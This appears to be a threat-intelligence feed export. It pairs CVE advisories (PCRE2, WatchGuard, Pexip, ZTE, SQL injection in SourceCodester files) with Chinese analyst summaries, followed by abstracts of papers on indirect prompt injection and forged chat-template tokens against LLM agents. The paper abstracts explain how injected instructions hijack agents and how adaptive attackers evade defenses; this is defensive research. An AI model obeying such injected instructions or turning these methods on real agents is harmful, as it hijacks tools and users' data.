将资产关键性、网络可达性与业务停机成本纳入评分校准，而非仅依赖通用评分
对 OT 环境建立以已知攻击拓扑为基准的场景化风险模型，并定期回归验证
在漏洞管理与编排平台中记录评分来源、版本与权重，保证结果可追溯与可复现

items.recommended_action: 1) 将该条目置为无效或待人工复核状态，不要依据标签 apt/malware 做任何归因或告警。2) 回溯采集任务与解析规则，确认 360CERT 原始报告是否抓取失败、source_url 是否被错误替换为备案系统页面。3) 对空正文、空 CVEs 且标题为非技术性内容的条目建立入库过滤与告警规则，避免污染情报库与后续狩猎线索。4) 若确需跟踪 360CERT 相关报告，请从官方渠道重新获取原文后再行分析。

items.title: PCRE2 before 10.49, when there is an attacker-controlled regular expression and certain JIT API usage, allows an out-of-bounds write with arbitrary data.
items.summary: PCRE2 before 10.49, when there is an attacker-controlled regular expression and certain JIT API usage, allows an out-of-bounds write with arbitrary data.

llm_summary.summary_zh: CVE-2026-103111 是 PCRE2 库中的一个高危漏洞，影响版本低于 10.49。PCRE2 是一个广泛使用的正则表达式库，许多编程语言和应用程序（如 PHP、Apache、Nginx 等）都依赖它。该漏洞存在于 JIT（即时编译）编译功能中：当应用程序使用特定的 JIT API 处理攻击者可控的正则表达式时，可能导致越界写入（out-of-bounds write），并且写入的数据可以是任意内容。这意味着攻击者可能通过构造恶意正则表达式，在目标进程的内存中写入任意数据，从而造成内存破坏，进而可能导致远程代码执行或服务崩溃。CVSS 3.1 评分为 7.6，属于高危漏洞，攻击向量为网络（AV:N），攻击复杂度低（AC:L），需要低权限（PR:L），无需用户交互（UI:N），作用范围不变（S:U），对机密性影响低（C:L），对完整性影响高（I:H），对可用性影响低（A:L）。目前没有 EPSS 评分，也未发现已知在野利用。修复建议是升级到 PCRE2 10.49 或更高版本。如果无法立即升级，应避免将不受信任的正则表达式传递给 JIT 编译接口，或考虑禁用 JIT 功能以降低风险。由于许多应用可能间接使用 PCRE2，建议尽快排查并修补。
llm_summary.why_it_matters_zh: 该漏洞允许攻击者通过恶意正则表达式触发越界写入，可导致内存破坏甚至远程代码执行。CVSS 7.6 高危，且影响广泛使用的 PCRE2 库，若应用暴露于不可信输入且启用 JIT，风险极大。建议尽快打补丁。
llm_summary.impact_zh: 成功利用可造成越界写入任意数据，导致内存破坏、敏感信息篡改、服务崩溃，甚至远程代码执行。攻击者需能控制传入的正则表达式并触发 JIT 编译 API。

items.why_it_matters: 该漏洞允许攻击者通过恶意正则表达式触发越界写入，可导致内存破坏甚至远程代码执行。CVSS 7.6 高危，且影响广泛使用的 PCRE2 库，若应用暴露于不可信输入且启用 JIT，风险极大。建议尽快打补丁。

items.title: A NULL pointer dereference vulnerability in the WatchGuard Fireware OS authentication process allows a remote, unauthenticated attacker to crash the management daemon by sending...
items.summary: A NULL pointer dereference vulnerability in the WatchGuard Fireware OS authentication process allows a remote, unauthenticated attacker to crash the management daemon by sending a specially request to the login interface, resulting in a denial of service.

llm_summary.summary_zh: 本条目为 NVD 元数据来源的漏洞信息, 涉及 WatchGuard Fireware OS 认证流程中的空指针解引用 (NULL pointer dereference) 缺陷, 编号 CVE-2026-86134。Fireware OS 是 WatchGuard 防火墙 / UTM 安全网关设备所使用的操作系统, 其管理守护进程负责对外提供登录认证与管理接口。按照描述, 问题出在该认证处理流程中: 当远端攻击者向登录接口发送一个特制请求时, 服务端代码会对一个空指针进行解引用访问, 从而引发未捕获的异常, 最终导致管理守护进程崩溃退出。该漏洞的关键特征有三点: 一是触发路径位于认证环节之前或认证环节内部, 因此攻击者不需要持有任何有效凭据、会话或已认证身份即可尝试触发, 属于未认证可触发 (unauthenticated); 二是触发方式为通过网络向设备的登录接口发送请求, 属于远程可利用 (remote), 前提是攻击者能够访问到该管理接口的网络位置; 三是从现有描述看, 漏洞只造成守护进程崩溃, 即纯可用性影响 (拒绝服务 / DoS), 描述中未提及内存破坏后可实现任意代码执行、权限提升、绕过认证或配置泄露等后果, 也未提及数据转发面或已建立的 VPN 隧道会受到影响。当前元数据未提供 CVSS 评分、EPSS 分值、受影响版本区间以及修复固件版本, 因此实际影响范围与利用难度仍需以厂商安全公告为准。需要特别说明的是, 本条目未列入 CISA KEV, 来源字段也未标注在野利用 (exploit_in_the_wild 为 False), 因此目前没有任何公开证据表明该漏洞已被实际利用或已武器化, 不应据此推断存在活跃攻击活动。对防御方而言, 该漏洞的处置重点在于: 收敛管理接口的网络暴露面、限制可访问源、监控管理守护进程异常重启与登录接口异常请求, 并在厂商发布修复版本后尽快升级固件。
llm_summary.why_it_matters_zh: 该缺陷位于安全设备自身的管理认证面, 且无需凭据即可远程触发守护进程崩溃。防火墙/UTM 的管理接口一旦中断, 运维与应急响应能力会直接受损, 而 WatchGuard 设备的管理端口在不少部署中对外暴露, 因此暴露面收敛与固件升级应优先安排。
llm_summary.impact_zh: 影响为可用性层面的拒绝服务: 未认证远程攻击者可导致 WatchGuard Fireware OS 管理守护进程崩溃, 使管理 Web 界面/管理接口暂时不可用, 运维人员无法登录设备进行配置与排障; 若守护进程未能自动恢复, 则需人工介入重启。基于现有描述, 不涉及代码执行、权限提升或数据泄露, 也未见对数据转发面的直接影响。

items.why_it_matters: 该缺陷位于安全设备自身的管理认证面, 且无需凭据即可远程触发守护进程崩溃。防火墙/UTM 的管理接口一旦中断, 运维与应急响应能力会直接受损, 而 WatchGuard 设备的管理端口在不少部署中对外暴露, 因此暴露面收敛与固件升级应优先安排。

items.title: A security flaw has been discovered in SourceCodester Online Reviewer Management System 1.0. The affected element is an unknown function of the file /reviewer_0/admins/assessmen...
items.summary: A security flaw has been discovered in SourceCodester Online Reviewer Management System 1.0. The affected element is an unknown function of the file /reviewer_0/admins/assessments/examproper/exam-delete.php. The manipulation of the argument test_id results in sql injection. The attack can be launched remotely. The exploit has been released to the public and may be used for attacks.

llm_summary.summary_zh: CVE-2026-102910 是 SourceCodester Online Reviewer Management System 1.0 中被披露的一处 SQL 注入漏洞。受影响的是文件 /reviewer_0/admins/assessments/examproper/exam-delete.php 中的一个未具名功能函数，其根本原因是该逻辑在处理 test_id 参数时未进行充分的输入校验，也未采用参数化查询，导致外部可控的字符串被直接拼接进 SQL 语句并在后端数据库中执行。攻击者可远程发起利用（CVSS 3.1 向量 AV:N/AC:L/PR:N/UI:N，即无需认证、无需用户交互、攻击复杂度低），仅需向该删除接口提交构造过的 test_id 取值即可触发注入。NVD 给出的 CVSS 3.1 基础评分为 7.3，属于高危；由于注入点位于删改类操作路径上，对机密性、完整性和可用性均构成低度（C:L/I:L/A:L）影响。受影响版本为 1.0，厂商未在该元数据中提供修复版本信息。漏洞描述同时说明其利用方式已经公开，存在被用于实际攻击的可能，但截至本元数据发布，该 CVE 未被列入 CISA KEV，也没有任何已确认的在野利用标记，因此不应推断其已被武器化或已在真实环境中被利用。从防御视角看，该漏洞的关键风险点在于：后台管理路径可被直接访问、缺乏认证门槛、参数直连数据库且利用成本极低，公网暴露的实例容易被自动化扫描批量发现。建议尽快向厂商确认并升级到修复版本；若暂时无法升级，应将该管理系统限制在内网或白名单访问范围内，避免管理后台直接暴露于互联网，同时在前端与后端对 test_id 一类标识参数实施严格的整数/白名单校验，部署针对 SQL 注入的 WAF 检测规则，并将数据库账号权限收敛至最小必要，开启异常查询与删除操作的审计告警。
llm_summary.why_it_matters_zh: 存在未认证的远程 SQL 注入，利用门槛极低，且漏洞描述明确表示利用方式已公开。暴露在公网的管理后台极易被自动化扫描批量命中，导致数据库数据被读取、篡改或删除。
llm_summary.impact_zh: 攻击者可远程读取、篡改或删除后端数据库中的数据，破坏评测与考试记录的完整性和可信度，并可能借助数据库权限进一步横向渗透。依据 CVSS 3.1，机密性、完整性、可用性均为低度影响，基础评分 7.3（高危）。

items.why_it_matters: 存在未认证的远程 SQL 注入，利用门槛极低，且漏洞描述明确表示利用方式已公开。暴露在公网的管理后台极易被自动化扫描批量命中，导致数据库数据被读取、篡改或删除。

items.title: There is an information disclosure vulnerability in ZTE U30 Air. Due to improper permission control, attackers can exploit the vulnerability to obtain relevant information.
items.summary: There is an information disclosure vulnerability in ZTE U30 Air. Due to improper permission control, attackers can exploit the vulnerability to obtain relevant information.

llm_summary.summary_zh: 该漏洞编号 CVE-2026-86556，由 NVD 收录，影响中兴 ZTE U30 Air 设备（便携式 5G 随身 Wi-Fi / 移动热点类产品）。漏洞根因是设备在权限控制上的实现不当（improper permission control），攻击者可以利用这一缺陷绕过预期的访问边界，读取到本不应对外暴露的信息，从而构成信息泄露（information disclosure）。CVSS 3.1 基础评分为 5.3，向量为 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N。该向量表明：攻击可经网络远程发起，攻击复杂度低，无需任何身份认证或既有权限，也不需要受害者交互；影响范围局限于同一安全域，仅机密性受到有限影响（C:L），完整性与可用性均不受影响。因此综合定级为中等（medium），单次利用的危害有限，但若泄露内容涉及设备凭据、配置或账号信息，可能被用于后续横向渗透或权限提升。目前 NVD 条目未提供受影响的具体固件版本号、厂商安全公告链接与修复版本信息，也未收录 EPSS 分值，KEV 目录未列入；输入数据中的在野利用相关字段均为否，无任何证据表明该漏洞已被武器化或公开利用代码存在。防御方应将 ZTE U30 Air 的固件纳入资产清单并确认版本，按厂商发布的更新升级；在修复前避免将设备管理界面暴露在公网，限制 WAN 侧访问来源并更改默认口令，同时关注日志中异常的配置或信息读取请求。
llm_summary.why_it_matters_zh: 远程、无需认证与交互即可触发，虽仅造成有限机密性泄露且当前无在野利用证据，但随身 Wi-Fi 类设备常被直接暴露于公网，一旦泄露配置或凭据可能成为内网入口，应尽快升级固件并收敛暴露面。
llm_summary.impact_zh: 机密性受到有限影响，攻击者可能未经授权读取设备内的敏感信息（如配置或状态数据）；完整性与可用性不受影响。未发现数据表明已被在野利用或列入 KEV，实际影响取决于所泄露信息的具体敏感程度与设备暴露情况。

items.why_it_matters: 远程、无需认证与交互即可触发，虽仅造成有限机密性泄露且当前无在野利用证据，但随身 Wi-Fi 类设备常被直接暴露于公网，一旦泄露配置或凭据可能成为内网入口，应尽快升级固件并收敛暴露面。

items.title: Pexip Infinity before 38.2, plus 39.0, 39.1, and 40.0, is affected by improper input validation within an internal Pexip Infinity service that allows an attacker with local acce...
items.summary: Pexip Infinity before 38.2, plus 39.0, 39.1, and 40.0, is affected by improper input validation within an internal Pexip Infinity service that allows an attacker with local access to escalate privileges to root. Exploitation requires an attacker to be able to run arbitrary code on a node by either achieving remote code execution via some other vulnerability or having administrative access to the operating system.

llm_summary.summary_zh: CVE-2026-103106 是影响 Pexip Infinity 视频会议/协作平台的本地权限提升漏洞。根据 NVD 元数据，受影响版本为 38.2 之前的所有版本，以及 39.0、39.1 和 40.0 这三个具体版本。漏洞根因是 Pexip Infinity 内部某个服务在处理输入时缺乏充分的校验（improper input validation），攻击者可以借此缺陷绕过权限边界，将自身权限从普通/低权限提升至 root（超级用户），从而完全控制该节点。需要特别强调的是该漏洞的利用前提：攻击者必须已经能够在目标节点上执行任意代码。实现这一前提有两条路径，一是先通过其他漏洞取得远程代码执行（RCE）能力，二是本身已拥有该操作系统的管理访问权限。因此它并非可直接远程触发的独立入口点，而是典型的“后利用（post-exploitation）”阶段的提权组件，通常被攻击者用于在初步突破后完成权限固化、横向移动或深度驻留。CVSS 3.1 评分为 7.8，向量为 AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，即攻击者需本地访问、低权限前提、无需用户交互，成功利用后对机密性、完整性和可用性均造成高影响，整体定级为高危。元数据中未提供受影响的具体组件名称与厂商回应细节，NVD 亦未标记该漏洞已列入 KEV 或在野利用，因此不应假设其已被实际利用。防御重点在于尽快按厂商建议升级到已修复版本，并收敛对 Pexip 节点的本地及远程访问面。
llm_summary.why_it_matters_zh: 该漏洞可让已在节点上获得代码执行或系统管理权限的攻击者直接提权至 root，实现完全接管，属于典型的后渗透关键环节。Pexip Infinity 常用于企业级视频会议与远程协作，节点被完全控制可能导致会议流量、凭证与内部网络暴露。虽未被标记为在野利用，但高危且无用户交互，应优先修复。
llm_summary.impact_zh: 成功利用后攻击者可获得目标节点的 root 权限，完全控制该主机，进而读取或篡改会议与认证数据、植入持久化后门、以该节点为跳板横向移动至企业内部网络。前提是攻击者已具备本地代码执行能力或操作系统管理权限，因此本漏洞本身不构成远程未授权入口。

items.why_it_matters: 该漏洞可让已在节点上获得代码执行或系统管理权限的攻击者直接提权至 root，实现完全接管，属于典型的后渗透关键环节。Pexip Infinity 常用于企业级视频会议与远程协作，节点被完全控制可能导致会议流量、凭证与内部网络暴露。虽未被标记为在野利用，但高危且无用户交互，应优先修复。

items.title: Pexip Infinity before 38.2, plus 39.0, 39.1 and 40.0, is affected by improper input validation in the media implementation which allows a remote attacker to trigger a software a...
items.summary: Pexip Infinity before 38.2, plus 39.0, 39.1 and 40.0, is affected by improper input validation in the media implementation which allows a remote attacker to trigger a software abort resulting in a denial of service.

llm_summary.summary_zh: NVD 披露了 CVE-2026-103104，影响 Pexip Infinity 视频会议与协作平台。该产品通常以自托管方式部署在企业网内，承担会议桥接、互操作网关与音视频媒体处理等职责，其媒体实现负责接收、解析并转发音视频流。根据公告，媒体模块存在输入校验不当（improper input validation）缺陷：远程攻击者无需任何认证，只要能够访问目标实例的媒体相关接口或端口并提交特制数据，即可使相关进程触发软件中止（software abort），造成拒绝服务。受影响版本为 38.2 之前的版本，以及 39.0、39.1 和 40.0；也就是说，凡使用上述版本范围且媒体端口对外可达的部署都可能被命中。CVSS 3.1 评分为 7.5，向量为 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H，表明攻击可经网络远程发起、无需权限与用户交互，唯一受影响的安全属性是可用性，且达到高危级别，但不会直接导致数据泄露或篡改。当前 EPSS 无评分数据，NVD 的 KEV 目录未收录该 CVE，输入数据中也没有任何“已在野利用”“已武器化”或“已知被利用”的明确标注，因此不应推断已存在实际攻击活动。对蓝队而言，该漏洞利用门槛较低，而目标通常承载关键会议业务并对外提供服务，一旦被反复触发会造成媒体服务不可用、会议中断，属于典型的高可用性风险。建议管理员尽快核查资产版本并按厂商公告升级到已修复版本（38.2 及后续安全版本），在补丁窗口期内通过防火墙/安全组限制媒体端口（如 SIP、RTP/RTCP 相关端口）的互联网暴露，仅允许可信网络访问，同时启用进程崩溃与异常日志监控，以便及时发现拒绝服务征兆。
llm_summary.why_it_matters_zh: 远程未认证即可触发 Pexip Infinity 媒体进程崩溃，直接冲击视频会议可用性；利用门槛低，暴露在互联网的实例应优先处置。
llm_summary.impact_zh: 可导致 Pexip Infinity 媒体服务进程异常中止，引发会议中断与拒绝服务；不涉及机密性与完整性影响。

items.title: Pexip Infinity 30.0 through 40.x before 41.0 is affected by improper input validation in the web server that allows a malicious attacker to render a Pexip Infinity node inaccess...
items.summary: Pexip Infinity 30.0 through 40.x before 41.0 is affected by improper input validation in the web server that allows a malicious attacker to render a Pexip Infinity node inaccessible.

llm_summary.summary_zh: 该条目来自 NVD 元数据，编号 CVE-2026-103101。受影响产品为 Pexip Infinity 视频会议/协作平台，版本范围覆盖 30.0 起至 40.x，即 41.0 正式发布之前的全部版本。问题根因是其 Web 服务器对输入数据的校验不充分（improper input validation），攻击者无需任何身份认证，即可通过向对外暴露的 Web 服务发送特制请求，使 Pexip Infinity 节点失去响应、无法访问。CVSS 3.1 评分为 8.6（High），向量 AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H，含义是：可远程发起、利用复杂度低、不需要权限、不需要用户交互，且影响范围跨越安全边界（Scope Changed），但仅造成可用性（Availability）损害，对机密性与完整性没有影响。由于 Pexip Infinity 通常承担企业级音视频会议与网关职能，单节点不可用可能直接中断会议服务，对业务连续性形成压力。当前元数据中未提供受影响产品细分、厂商公告细节与 EPSS 分值，也未列入 CISA KEV，输入数据同样未标记在野利用，因此不应推断该漏洞已被实际利用。修复方式为升级到 41.0 或更高版本；在无法立即升级时，应优先收敛 Web 管理/服务接口的互联网暴露面。
llm_summary.why_it_matters_zh: 未认证远程即可使 Pexip Infinity 节点不可用，企业音视频会议与网关服务可能直接中断。8.6 高分且攻击门槛低（AC:L/PR:N/UI:N），暴露在互联网的 Web 接口是主要风险面。目前无 KEV 与在野利用标记，按常规高危补丁流程处置，优先收敛暴露面。
llm_summary.impact_zh: 可用性受损：单个 Pexip Infinity 节点可被远程、未认证地打至不可访问，导致会议与网关服务中断；未体现数据泄露或篡改风险。

items.title: Pexip Infinity before 41.1 is affected by improper input validation in the media implementation that allows a remote attacker to trigger a software abort resulting in a denial o...
items.summary: Pexip Infinity before 41.1 is affected by improper input validation in the media implementation that allows a remote attacker to trigger a software abort resulting in a denial of service.

llm_summary.summary_zh: 本条目来自 NVD，描述 Pexip Infinity 41.1 之前版本中存在的一个输入验证类缺陷，位于产品的媒体（media）实现部分。Pexip Infinity 是面向企业的视频会议与实时协作平台，其媒体处理模块负责音视频流的接收、解析、转码与转发，通常直接暴露在会议接入网络中并接受来自参会终端的实时数据。由于该模块对传入数据缺乏充分的校验（improper input validation），未经身份认证的远程攻击者可以通过网络向目标系统发送特制的媒体数据，使进程在处理过程中进入异常状态并触发软件中止（software abort），进而造成服务不可用。按照 CVSS 3.1 的评估（AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H，7.5 分），该漏洞利用门槛较低：无需认证、无需用户交互、可远程触发，且对机密性与完整性没有影响，唯一的后果是可用性完全丧失，属于典型的远程拒绝服务类问题。对于承载关键会议、应急指挥或对外客户沟通的业务场景，即使是拒绝服务也可能造成直接的服务中断与业务影响。目前公开数据未提供 EPSS 分值，该 CVE 未列入 KEV，来源字段也未标记在野利用迹象，因此不应推断其已被实际利用或已武器化；但攻击面暴露于网络、利用条件简单，仍应作为需要尽快处置的高危项对待。厂商已在 41.1 版本中修复该问题，升级到 41.1 或更高版本是消除风险的根本手段。
llm_summary.why_it_matters_zh: 媒体服务通常需要对外暴露并接收实时流，未认证远程即可触发进程中止，利用门槛低且直接造成会议业务中断。虽无在野利用证据，仍属应优先修复的高危可用性风险，尤其对承载关键通信的企业。
llm_summary.impact_zh: 远程未认证攻击者可使 Pexip Infinity 媒体进程非正常中止，导致会议/媒体服务中断，仅影响可用性（C:N/I:N/A:H）。

items.title: A vulnerability was identified in SourceCodester Online Reviewer Management System 1.0. Impacted is an unknown function of the file /reviewer_0/admins/assessments/examproper/btn...
items.summary: A vulnerability was identified in SourceCodester Online Reviewer Management System 1.0. Impacted is an unknown function of the file /reviewer_0/admins/assessments/examproper/btn_functions.php. The manipulation of the argument access_code leads to sql injection. The attack can be initiated remotely. The exploit is publicly available and might be used.

llm_summary.summary_zh: CVE-2026-102909 影响 SourceCodester Online Reviewer Management System 1.0（在线评审/考试管理系统），是一处典型的 Web 应用 SQL 注入漏洞。问题位于文件 /reviewer_0/admins/assessments/examproper/btn_functions.php 中一个未披露名称的函数，根因是对 access_code 参数取值未做充分的输入校验与参数化查询处理，攻击者可向该参数注入可改变后端 SQL 语义的内容，从而操纵数据库查询结果。从路径看，该文件处于管理端 admins/assessments/examproper 目录，推测为考试/评估模块中由按钮触发的后端处理逻辑（btn_functions），通常用于校验评审访问码 access_code。该接口可被远程直接访问，利用无需本地权限、无需前置凭证、也不需要用户交互（CVSS 向量 AV:N/AC:L/PR:N/UI:N），因此利用门槛较低。NVD 描述指出，针对该漏洞的利用代码已公开可获取，存在被滥用的可能；但该条记录未列入 CISA KEV，也没有在野利用的正式标注，故不应对实际攻击态势做过度推断。CVSS 3.1 基础评分为 7.3（AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L），机密性、完整性与可用性均为低程度影响。SourceCodester 该系列 1.0 版本多用于教学演示或小型部署，官方补丁与维护状态在现有元数据中并未说明，实际风险取决于资产是否面向互联网暴露以及后端数据库权限配置。
llm_summary.why_it_matters_zh: 该 SQL 注入可远程、免认证触发，直接威胁数据库中的用户、评审与成绩数据；公开利用代码已存在，暴露在互联网且未加固的部署应优先处置。
llm_summary.impact_zh: 成功利用可篡改后端 SQL 查询逻辑，导致数据库敏感信息泄露（账号、评审记录、成绩）、数据被篡改或删除，并可能经由数据库层进一步影响业务完整性与可用性。

items.why_it_matters: 该 SQL 注入可远程、免认证触发，直接威胁数据库中的用户、评审与成绩数据；公开利用代码已存在，暴露在互联网且未加固的部署应优先处置。

items.title: A vulnerability was determined in SourceCodester Online Reviewer Management System 1.0. This issue affects some unknown processing of the file /reviewer_0/admins/assessments/exa...
items.summary: A vulnerability was determined in SourceCodester Online Reviewer Management System 1.0. This issue affects some unknown processing of the file /reviewer_0/admins/assessments/examproper/questions-view.php. Executing a manipulation of the argument ID can lead to sql injection. It is possible to launch the attack remotely. The exploit has been publicly disclosed and may be utilized.

llm_summary.summary_zh: CVE-2026-102908 是 SourceCodester Online Reviewer Management System 1.0 中被确认的一处 SQL 注入漏洞，问题出在文件 /reviewer_0/admins/assessments/examproper/questions-view.php 的一段未知处理逻辑上。当请求中的 ID 参数被外部可控输入操纵时，程序未对该参数做充分的类型校验与参数化处理，导致攻击者可以将注入内容拼接到后端 SQL 查询中并改变查询语义，从而读取、篡改或删除数据库中的敏感数据（如用户账号、口令散列、题库与考核记录等），在特定条件下还可能借助数据库功能进一步影响宿主环境。该漏洞可远程触发，攻击者无需事先认证，也不需要受害者交互，攻击复杂度低，因此利用门槛很低。NVD 给出的 CVSS 3.1 基础评分为 7.3（AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L），属于高危级别；不过 EPSS 分数缺失，且该条目未被列入 CISA KEV，来源字段也表明目前没有确认的在野利用记录。受影响产品为 SourceCodester Online Reviewer Management System 1.0，这是一款用于在线评审/考核的 PHP Web 应用，通常部署在中小机构的内网或公网服务器上。漏洞详情与利用方式已被公开披露，意味着任何能访问该 questions-view.php 页面的攻击者都可能复现测试，应从暴露面与补丁两个方向尽快处置。遗憾的是，厂商与受影响产品字段未提供更多信息，官方是否已发布修复版本尚不明确。
llm_summary.why_it_matters_zh: 该漏洞可远程、免认证、低复杂度触发，CVSS 7.3；利用细节已公开披露，任何能访问该页面的攻击者都可能尝试复现，可能导致后台数据库数据泄露或被篡改。当前未列入 KEV，也未确认在野利用，但仍应优先收敛暴露面。
llm_summary.impact_zh: 成功利用可导致数据库层面的敏感信息泄露、数据被篡改或删除，进而危及账号凭据与考核记录的完整性和机密性，并可能为后续横向移动提供跳板。综合机密性、完整性、可用性影响评估为高危。

items.why_it_matters: 该漏洞可远程、免认证、低复杂度触发，CVSS 7.3；利用细节已公开披露，任何能访问该页面的攻击者都可能尝试复现，可能导致后台数据库数据泄露或被篡改。当前未列入 KEV，也未确认在野利用，但仍应优先收敛暴露面。

items.title: IAM for AI agents: A Practical Enterprise Framework
items.summary:
What is IAM for AI agents?

AI agents authenticate, invoke tools, and act across enterprise systems with delegated authority. IAM for AI Agents is the identity-control architecture that governs those actors. This guide covers the limits of conventional provisioning, the components that matter, how to evaluate framework choices, and what runtime evidence proves an agent behaved as intended.

items.title: CounterSteer: Suppressing Indirect Prompt Injection with Activation Steering
items.summary: Indirect prompt injection makes an LLM agent treat untrusted retrieved text as instructions. We present CounterSteer, an inference-time defense that suppresses this behavior inside the model. Per model, a five-step recipe fits a residual-stream direction from paired episodes differing only in whether an embedded instruction is followed, and retains it only if it passes pre-specified causal and capability gates. At deployment, the direction is subtracted from every tool-result token during prefill. The edit is always on--there is no detection decision to evade--and requires no fine-tuning, auxiliary model, or added tokens, only white-box serving and tool-result span boundaries. Across five open-weights models (8B-106B, five vendor lineages), held-out attack success falls from 0.21-1.00 undefended to 0.00-0.17 defended, and AgentDojo compromise rate from 0.10-0.49 to 0.006-0.079, at 93-100% typography-normalized benign utility, with larger task-dependent costs when reasoning over steered content. A benchmark-level adaptive attacker reaching 0.67-0.73 undefended is held to roughly a quarter of that on the two most deeply evaluated models. Among the defenses we measured on capable models, those achieving lower compromise rates either lost 22-89% of benign utility or fine-tuned the served weights. White-box gradient attacks through the deployed vector compromise at most 2 of 52 episodes, and none of 2,052 replayed human red-team attacks succeeds. CounterSteer largely neutralizes instructional takeover: a black-box framing search cracks 3 of 18 development samples. Parameter manipulation--attacker-chosen arguments in otherwise legitimate calls--is only partially resisted (13 of 18); the decision becomes linearly readable at argument emission but not at the examined pre-generation sites, and is not removed by the tested prefill- or decode-time steering, motivating argument-provenance controls.

llm_summary.summary_zh:
该论文针对 LLM 智能体面临的间接提示注入（indirect prompt injection）问题——即被检索回来的不可信文本被模型当作指令执行，从而导致工具调用被劫持——提出了一种推理时（inference-time）的模型内部防御方法 CounterSteer。与依赖外部检测器、输入过滤或额外分类模型的方案不同，CounterSteer 直接在残差流（residual stream）中构造一个方向向量来抑制「把工具结果当指令」这一行为。

方法层面：对每个模型，作者给出一个五步配方（five-step recipe）。其核心是用成对情节（paired episodes）做对比拟合，这些情节唯一的差别在于嵌入的指令是否被模型遵循；由此从残差流中拟合出一个方向向量。该方向并非无条件采纳，而是必须通过预先设定的因果门（causal gates）与能力门（capability gates）才会被保留，以确认它确实因果性地影响注入行为、同时不损害模型本身的能力。

部署层面：在 prefill 阶段，从每一个「工具结果」token 的激活中减去该方向。其特点在于编辑是常开的（always on），不存在可被攻击者规避的「是否检测到注入」的判定环节；无需微调、无需辅助模型、不增加额外 token，只要求白盒推理服务能力以及工具结果 span 的边界信息。

实验：在五个开放权重模型（8B–106B，覆盖五个厂商谱系）上，留出攻击的成功率从无防御时的 0.21–1.00 降至 0.00–0.17；AgentDojo 基准上的妥协率从 0.10–0.49 降至 0.006–0.079；在排版归一化后，良性任务效用保持在 93–100%，但当模型需要对被 steering 的内容进行推理时，会出现较大的、依赖具体任务的开销。针对基准级自适应攻击者，无防御时可达 0.67–0.73 的成功率，在两个评估最深入的模型上被压制至约四分之一。与作者测量的其他防御相比，在强模型上取得更低妥协率的方案，要么损失 22–89% 的良性效用，要么必须微调实际服务的权重。鲁棒性方面：通过已部署向量进行的白盒梯度攻击最多攻破 52 个情节中的 2 个；重放的 2052 次人类红队攻击无一成功。

局限与边界：CounterSteer 基本中和了「指令劫持」这一类攻击（黑盒框架搜索在 18 个开发样本中攻破 3 个），但对参数操纵（在看似合法的调用中由攻击者指定参数）只能部分抵抗（18 个中 13 个被攻破）。论文指出该决策在参数发出（argument emission）时刻线性可读，但在所检查的生成前位置不可读，且所测试的 prefill 或 decode 阶段的 steering 都无法消除它，因此需要额外引入参数来源（argument-provenance）控制。
llm_summary.why_it_matters_zh: 间接提示注入是当前智能体落地的头号风险面，而主流防御多依赖外挂检测器、可被对抗绕过。该工作证明可在模型内部以常开的方向消减（steering）方式大幅压低攻击成功率，同时保持 93–100% 良性效用，且无需微调与辅助模型，为白盒部署者提供了可落地的新防御路径，也明确了「参数操纵」这一尚未覆盖的残余风险。
llm_summary.impact_zh: 适用于自行白盒托管开放权重模型、并以工具调用/检索增强方式对外提供智能体能力的场景（企业内网 RAG 助手、代码助手、自动化运维 Agent 等）。可直接迁移的部分包括：构建成对情节以拟合行为方向、用因果与能力门做上线前验收、在工具结果 span 上实施常开激活编辑。需注意其有效前提是白盒服务与对工具结果边界的精确切分；纯 API 黑盒调用场景无法直接套用。参数级篡改仍需依赖参数来源校验等独立控制。
detection_signals_zh: 工具结果 token 区间的激活向量被持续施加固定方向偏移（可由白盒侧监控激活分布是否出现稳定漂移）
模型在含不可信检索内容的输入下，工具调用意图与用户原始任务出现偏离（调用目标/参数与用户请求语义不匹配）
合法工具调用中出现攻击者可控的参数取值（参数来源无法追溯到用户指令或可信上下文）
同一任务在注入与非注入版本间行为出现显著差异，可用于构造离线回归检测用例
defense_advice_zh: 对自托管开放权重模型评估引入常开式激活 steering 作为纵深防御层，并在上线前以成对情节验证因果与能力门
精确实现工具结果 span 边界标记，确保 steering 只作用于工具返回内容而非系统提示与用户输入
将该防御与参数来源校验/参数白名单结合，弥补论文中未覆盖的参数操纵盲区
建立覆盖间接提示注入的离线回归基准（含自适应攻击者与红队重放集），持续度量攻击成功率与良性效用损失
记录并监控 steering 开启后推理类任务的能力回退，按任务类型评估是否需选择性启用

items.title: Same Bytes, Different Authority: Reserved-Token Representations in Chat-Template Prompt Injection
items.summary: Prompt injection against LLM agents becomes much stronger when the injected instruction is wrapped in the model's own chat template. A forged template marker such as <|im_start|> can reach the model either as a single reserved control token or as a sequence of ordinary subword tokens. The two decode to exactly the same text, and because tokenization runs on the server, the defender rather than the attacker decides which one the model receives. We use this to measure how much of the injected instruction's authority comes from the reserved token's learned representation. Encoding the forged markers as subwords, with the text held fixed and a control for the extra tokens this adds, lowers attack success on the InjecAgent benchmark by 39 to 66 percentage points on three of four open-weight families, and the gap carries over to multi-turn agent tasks in AgentDojo. On Qwen3-8B the gap is 8 points, because without reserved ids the model still recognises the forged turn from its text by reasoning; suppressing the reasoning block widens the gap to 50. The authority sits in the single learned vector at the marker position: the mean of the marker's subword vectors does not reproduce it, the vector of the nearest ordinary token restores the attack on Llama-3.1, and an adaptive attacker who searches for non-reserved markers finds such embedding neighbours on three of four families. In every base and instruction-tuned pair we test, instruction tuning strengthens the model's preference for reserved markers. The standard mitigation, a tokenizer option that encodes special tokens as ordinary subwords, applies only to tokens a configuration declares special, so in 33 of 67 distinct tokenizer configurations, covering 255 of the 400 most-downloaded chat models on Hugging Face, it leaves intact the tool-protocol tokens through which agents read untrusted tool output, and the gap persists on that channel.

